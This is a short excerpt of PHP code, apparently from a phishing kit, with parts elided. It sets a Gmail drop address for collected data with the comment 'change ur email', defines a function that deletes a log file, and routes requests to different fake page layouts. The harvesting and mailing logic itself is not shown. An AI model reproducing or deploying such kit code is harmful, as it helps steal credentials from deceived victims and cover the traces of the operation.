...
$send    = "jacvbghyujkiolpwemk675@gmail.com"; //change ur email
...
function mj_remove_log_file(){ $logf = 'xxx.txt'; if(file_exists($logf)){ unlink($logf); return true; } return false; }
...
if(isset($_REQUEST['_do']))
{
    ...
    switch($_REQUEST['_do'])
    {
        ...
        case'layout2':
            ...
            //echo mj_load_view_2();
            //echo file_get_contents('inner_1.html');
            include '_inner.php';  
